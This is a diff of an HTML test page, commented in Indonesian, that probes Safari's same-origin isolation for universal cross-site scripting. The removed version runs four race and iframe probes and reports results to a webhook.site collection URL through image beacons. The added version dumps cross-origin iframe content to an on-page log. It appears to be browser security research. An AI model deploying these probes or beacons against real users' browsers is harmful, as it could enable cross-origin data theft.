@@ -1,101 +1,40 @@
 <!DOCTYPE html>
 <html>
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>SOP/UXSS Origin-Isolation Probe</title>
-<style>
-  body{font-family:-apple-system,system-ui,sans-serif;margin:0;padding:16px;line-height:1.5}
-  h1{font-size:18px}
-  button{font-size:16px;padding:12px 16px;margin:6px 0;width:100%}
-  #log{white-space:pre-wrap;background:#111;color:#0f0;padding:12px;border-radius:8px;
-       font-family:ui-monospace,Menlo,monospace;font-size:12px;margin-top:12px;min-height:120px}
-  .cfg{background:#fffbdd;padding:8px;border-radius:6px;font-size:13px}
-  iframe{width:100%;height:60px;border:1px solid #ccc;margin-top:8px}
-</style>
+<head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>SOP Confirm</title>
+<style>body{font-family:-apple-system,sans-serif;padding:16px}
+button{font-size:16px;padding:12px;width:100%}
+#log{white-space:pre-wrap;background:#111;color:#0f0;padding:12px;font:12px ui-monospace,Menlo;margin-top:12px;min-height:200px}
+iframe{width:100%;height:50px}</style>
 </head>
 <body>
-<h1>Safari Origin-Isolation Probe (SOP / UXSS)</h1>
-<p class="cfg"><b>Ganti dulu:</b> set <code>WEBHOOK</code> &amp; <code>CROSS</code> di bawah,
-lalu host file ini di origin kamu (github.io / localhost) dan buka di Safari.
-Hasil <code>blocked=SecurityError</code> = aman. Hasil <code>ok=...</code> = temuan.</p>
-
-<button onclick="probe1()">Probe 1 — iframe cross-origin DOM read</button>
-<button onclick="probe2()">Probe 2 — about:blank → cross-origin inherit</button>
-<button onclick="probe3()">Probe 3 — navigation race read</button>
-<button onclick="probe4()">Probe 4 — blob: origin check</button>
-
+<h1>SOP Confirm — dump isi, bukan cuma length</h1>
+<button onclick="go()">Baca iframe cross-origin (tunggu 2 dtk)</button>
 <div id="log">ready…</div>
-<iframe id="f"></iframe>
-
+<iframe id="f" src="https://example.com/"></iframe>
 <script>
-// ====== CONFIG ======
-var WEBHOOK = "https://webhook.site/e77cdf6b-d4e1-49fc-9a0e-fda3344aa342";          // interactsh / webhook.site
-var CROSS   = "https://example.com/";               // origin LAIN (bukan origin page ini)
-var NONCE   = Math.random().toString(36).slice(2,8);
-// ====================
-
-function out(s){ var l=document.getElementById('log'); l.textContent += "\n"+s; }
-function beacon(path, data){
-  var u = WEBHOOK + path + "?n=" + NONCE + "&o=" + encodeURIComponent(location.origin) + "&" + data;
-  // no-cors beacon; buktinya di sisi webhook
-  new Image().src = u; out("→ " + u);
+var CROSS="https://example.com/";
+function out(s){document.getElementById('log').textContent+="\n"+s;}
+function read(tag){
+  var f=document.getElementById('f');
+  try{
+    var doc=f.contentWindow.document;
+    var title=doc.title, body=(doc.body?doc.body.innerText:"").slice(0,120),
+        html=doc.documentElement.innerHTML.slice(0,120), dom=doc.domain;
+    out("["+tag+"] domain="+dom+"\n  title="+JSON.stringify(title)+
+        "\n  bodyText="+JSON.stringify(body)+"\n  html="+JSON.stringify(html));
+    if(/Example Domain/i.test(title+body+html))
+      out("  >>> REAL CROSS-ORIGIN READ (ada teks Example Domain) <<<");
+    else
+      out("  >>> blank/error doc — BUKAN cross-origin read <<<");
+  }catch(e){ out("["+tag+"] SecurityError="+e.name+"  (aman, isolasi bekerja)"); }
 }
-
-// Probe 1: baca DOM iframe cross-origin (harus SecurityError)
-function probe1(){
-  var f = document.getElementById('f');
-  f.onload = function(){
-    try {
-      var html = f.contentWindow.document.documentElement.innerHTML;
-      out("PROBE1 LEAK len="+html.length); beacon("/sop1","ok="+html.length);
-    } catch(e){ out("PROBE1 blocked "+e.name); beacon("/sop1","blocked="+e.name); }
-  };
-  f.src = CROSS;
-}
-
-// Probe 2: about:blank child -> navigate cross-origin -> race read (butuh gesture = tombol)
-function probe2(){
-  var w = window.open("about:blank","_blank");
-  if(!w){ out("PROBE2 popup blocked — pastikan dipicu dari tombol"); return; }
-  w.location = CROSS;
-  var tries=0, t=setInterval(function(){
-    tries++;
-    try {
-      var dom = w.document.domain;
-      out("PROBE2 read domain="+dom); beacon("/inherit","dom="+encodeURIComponent(dom));
-      if(dom && dom!==location.hostname){ clearInterval(t); w.close(); }
-    } catch(e){ /* expected saat cross-origin */ }
-    if(tries>400){ clearInterval(t); out("PROBE2 blocked (no cross-origin read)"); beacon("/inherit","blocked=1"); try{w.close()}catch(_){} }
-  },5);
-}
-
-// Probe 3: akses contentDocument tepat saat transisi same->cross origin
-function probe3(){
-  var f = document.getElementById('f');
-  f.src = "about:blank";
-  var tries=0, t=setInterval(function(){
-    tries++;
-    try {
-      var dom = f.contentWindow.document.domain;
-      if(dom && dom!==location.hostname){
-        out("PROBE3 RACE read="+dom); beacon("/race","x="+encodeURIComponent(dom)); clearInterval(t);
-      }
-    } catch(e){}
-    if(tries>1000){ clearInterval(t); out("PROBE3 blocked"); beacon("/race","blocked=1"); }
-  },1);
-  setTimeout(function(){ f.src = CROSS; }, 30);
-}
-
-// Probe 4: dokumen blob: — origin seharusnya mewarisi origin page (cek, jangan asumsi)
-function probe4(){
-  var b = new Blob(["<script>parent.postMessage(location.origin,'*')<\/script>"],{type:"text/html"});
-  var url = URL.createObjectURL(b);
-  window.addEventListener('message', function h(e){
-    out("PROBE4 blob origin="+e.data); beacon("/blob","origin="+encodeURIComponent(e.data));
-    window.removeEventListener('message',h);
-  });
-  var f=document.getElementById('f'); f.src=url;
+function go(){
+  var f=document.getElementById('f');
+  f.src="about:blank";
+  setTimeout(function(){ f.src=CROSS; }, 50);
+  f.onload=function(){ read("onload"); };
+  setTimeout(function(){ read("after-2s"); }, 2000); // tunggu example.com benar2 commit
 }
 </script>
 </body>
